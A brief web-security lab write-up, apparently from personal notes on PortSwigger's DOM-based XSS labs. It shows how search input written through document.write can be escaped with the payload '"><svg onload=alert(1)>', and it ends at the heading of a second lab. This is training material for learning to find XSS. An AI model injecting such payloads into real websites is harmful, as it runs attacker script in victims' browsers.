# ⚰️ DOM-based XSS

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://portswigger.net/web-security/cross-site-scripting/dom-based" %}

### Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in `document.write` sink using source `location.search`

We can see tha t the search input is treated as a img:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We now need to escape from this query, then onload:

```
"><svg onload=alert(1)>
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in `document.write` sink using source `location.search` inside a select element
